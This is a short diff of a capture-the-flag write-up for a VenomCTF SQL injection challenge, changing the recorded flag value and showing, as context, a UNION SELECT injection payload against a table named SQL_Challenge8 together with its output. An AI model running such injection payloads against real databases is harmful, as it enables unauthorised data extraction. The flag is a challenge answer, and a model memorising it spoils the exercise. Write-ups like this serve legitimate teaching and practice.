@@ -58,7 +58,7 @@ Group : more again
 '-1' union select (select id from SQL_Challenge8 limit 7,1),(select username from SQL_Challenge8 limit 7,1),(select level from SQL_Challenge8 limit 7,1) -- - 
 Your ID : 1337
 Username : Flag
-Group : VenomCTF{0rd3r_BY_9_1s_3rr0r}
+Group : VenomCTF{0rd3r_BY_4_1s_3rr0r}
 </pre>
 <p align='center'>
   <img src='https://github.com/enomarozi/Writeup-CTF_Online/blob/master/BackdoorCTF/Images/BurpSuit_Venom2.jpg'>
